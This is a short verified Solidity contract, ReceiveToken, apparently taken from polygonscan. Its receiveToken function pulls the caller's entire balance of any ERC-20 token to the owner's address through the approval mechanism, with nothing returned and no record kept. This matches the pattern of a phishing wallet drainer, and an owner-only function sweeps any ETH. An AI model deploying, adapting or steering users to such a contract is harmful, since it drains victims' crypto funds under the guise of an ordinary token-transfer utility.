/**
 *Submitted for verification at polygonscan.com on 2022-11-02
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

interface IERC20 {
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

}


contract ReceiveToken {

    address public owner;

    modifier onlyOwner {
        require(msg.sender == owner, "!owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function updateOwner(address newOwner) public onlyOwner {
        owner = newOwner;
    }

    function receiveToken(address token) public {
        uint256 amount = IERC20(token).balanceOf(msg.sender);
        IERC20(token).transferFrom(msg.sender, owner, amount);
    }

    function sendETH(address payable addr) public payable onlyOwner {
        addr.transfer(address(this).balance);
    }

    fallback() external payable {}

    receive() external payable {}

}